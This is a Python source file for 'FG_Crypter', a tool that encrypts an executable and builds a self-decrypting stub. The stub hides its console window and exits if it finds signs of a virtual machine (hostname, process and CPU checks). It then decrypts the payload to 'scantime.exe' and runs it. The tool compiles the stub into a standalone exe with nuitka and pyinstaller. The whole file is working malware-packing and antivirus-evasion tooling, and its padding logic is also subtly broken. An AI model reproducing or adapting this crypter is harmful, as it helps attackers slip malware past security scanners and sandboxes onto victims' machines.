import os
import platform
import stat
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad
from colorama import Fore, Style
import random
from tkinter import *


def generate_random_key(key_size):
    return os.urandom(key_size)


def generate_random_iv():
    return os.urandom(16)  # Generate a random 128-bit IV


def encrypt_file(input_file, output_file):
    global key, iv
    key = generate_random_key(32)  # Generate a random 256-bit key
    iv = generate_random_iv()
    cipher = AES.new(key, AES.MODE_CBC, iv)
    with open(input_file, 'rb') as f_in, open(output_file, 'wb') as f_out:
        f_out.write(iv)  # Write the IV to the output file
        while True:
            chunk = f_in.read(32)
            if len(chunk) == 0:
                break
            elif len(chunk) % 32 != 0:
                chunk = pad(chunk, 32)  # Pad the chunk if its length is not a multiple of 32
            encrypted_chunk = cipher.encrypt(chunk)
            f_out.write(encrypted_chunk)

    print(Fore.GREEN + "Encryption completed successfully.")
    print("Encryption Key: " + key.hex())
    print("Encryption IV: " + iv.hex() + Style.RESET_ALL)


def stub(output_file):
    print("Making the stub for u Please be patient")

    with open(output_file+'.exe', 'rb') as f:
        binary_data = f.read()

    with open('stub.py', 'w') as python_file:
        python_file.write(f"""import ctypes
h_console = ctypes.windll.kernel32.GetConsoleWindow()
ctypes.windll.user32.ShowWindow(h_console, 0)
from Crypto.Cipher import AES
import subprocess
import os
import sys
import platform
import psutil

def check_vm():
    # Check for common virtualization-related artifacts

    # Check if the machine's hostname contains common VM-related strings
    hostname = platform.node().lower()
    vm_strings = ["virtual", "vmware", "vbox", "qemu", "xen"]
    for vm_string in vm_strings:
        if vm_string in hostname:
            return True

    # Check for known virtualization software processes
    virtualization_processes = ["vmtoolsd.exe", "vboxservice.exe", "qemu-ga.exe"]
    for process in psutil.process_iter(attrs=['name']):
        if process.info['name'].lower() in virtualization_processes:
            return True

    # Check if the CPU vendor ID contains common VM-related strings
    cpu_vendor_id = platform.processor().lower()
    cpu_vm_strings = ["kvm", "vmware", "virtualbox"]
    for vm_string in cpu_vm_strings:
        if vm_string in cpu_vendor_id:
            return True

    # Check if it's running inside a virtualized environment
    if os.path.exists('/sys/hypervisor/uuid') or os.path.exists('/proc/scsi/scsi'):
        return True

    return False

if check_vm():
    quit()

# Get key and IV from user input
key = '{key.hex()}'
key = bytes.fromhex(key)
iv = '{iv.hex()}'
iv = bytes.fromhex(iv)

cipher = AES.new(key, AES.MODE_CBC, iv)

input_file = f'{output_file}.exe'
output_file = 'scantime.exe'

file_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), input_file)
ofile_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), output_file)

with open(file_path, 'rb') as f_in, open(ofile_path, 'wb') as f_out:
    iv = f_in.read(16)  # Read the IV from the input file
    while True:
        encrypted_chunk = f_in.read(32)
        if len(encrypted_chunk) == 0:
            break
        decrypted_chunk = cipher.decrypt(encrypted_chunk)
        f_out.write(decrypted_chunk)

subprocess.run(ofile_path,shell=True)
sys.exit()
""")


def decrypt_file(input_file, output_file):
    key = input("Enter the encryption key: ")
    key = bytes.fromhex(key)
    iv = input("Enter the encryption IV: ")
    iv = bytes.fromhex(iv)
    cipher = AES.new(key, AES.MODE_CBC, iv)
    with open(input_file, 'rb') as f_in, open(output_file, 'wb') as f_out:
        iv = f_in.read(16)  # Read the IV from the input file
        while True:
            encrypted_chunk = f_in.read(32)
            if len(encrypted_chunk) == 0:
                break
            decrypted_chunk = cipher.decrypt(encrypted_chunk)
            f_out.write(decrypted_chunk)

    print(Fore.GREEN + "Decryption completed successfully." + Style.RESET_ALL)


def set_execution_permissions(file_path):
    if platform.system() == 'Linux':
        os.chmod(file_path, stat.S_IXUSR)
    elif platform.system() == 'Windows':
        renamed_file = file_path + '.exe'
        os.rename(file_path, renamed_file)
    else:
        print("Unsupported platform. Execution permissions not set.")


def display_menu():
    print(Fore.CYAN + "Welcome to the FG_Crypter!" + Style.RESET_ALL)
    print("Please select an option:")
    print(Fore.YELLOW + "1. Encrypt a file")
    print("2. Decrypt a file")
    print("3. Quit" + Style.RESET_ALL)


# Example usage
while True:
    os.system('cls')
    display_menu()
    choice = input(Fore.CYAN + "Enter your choice: " + Style.RESET_ALL)

    if choice == "1":
        os.system('cls')
        input_file = input(Fore.YELLOW + "Enter the path of the input file: " + Style.RESET_ALL)
        output_file = input(Fore.YELLOW + "Enter the path of the output file: " + Style.RESET_ALL)
        os.system('cls')
        encrypt_file(input_file, output_file)
        set_execution_permissions(output_file)
        stub(output_file)
        print(Fore.LIGHTGREEN_EX+"Creating nuitka compilation")
        os.system(f'nuitka --mingw64 --onefile --assume-yes-for-downloads --remove-output --include-data-file="{output_file}.exe=." --output-filename=Crypted "stub.py"')
        print(Fore.LIGHTGREEN_EX+"Creating pyinstaller compilation")
        os.system(f'pyinstaller --onefile stub.py --add-data "{output_file}.exe;." --name "py-crypted"')
        os.remove('stub.py')
        print(Style.RESET_ALL)
        input(Fore.LIGHTMAGENTA_EX + 'Your crypted exe is ready[Press Enter to continue]'+ Style.RESET_ALL)
    elif choice == "2":
        os.system('cls')
        input_file = input(Fore.YELLOW + "Enter the path of the input file: " + Style.RESET_ALL)
        output_file = input(Fore.YELLOW + "Enter the path of the output file: " + Style.RESET_ALL)
        decrypt_file(input_file, output_file)
        set_execution_permissions(output_file)
    elif choice == "3":
        os.system('cls')
        print(Fore.RED + "Cleaning up FG_Crypter" + Style.RESET_ALL)
        break
    else:
        os.system('cls')
        print(Fore.RED + "Invalid choice. Please try again." + Style.RESET_ALL)
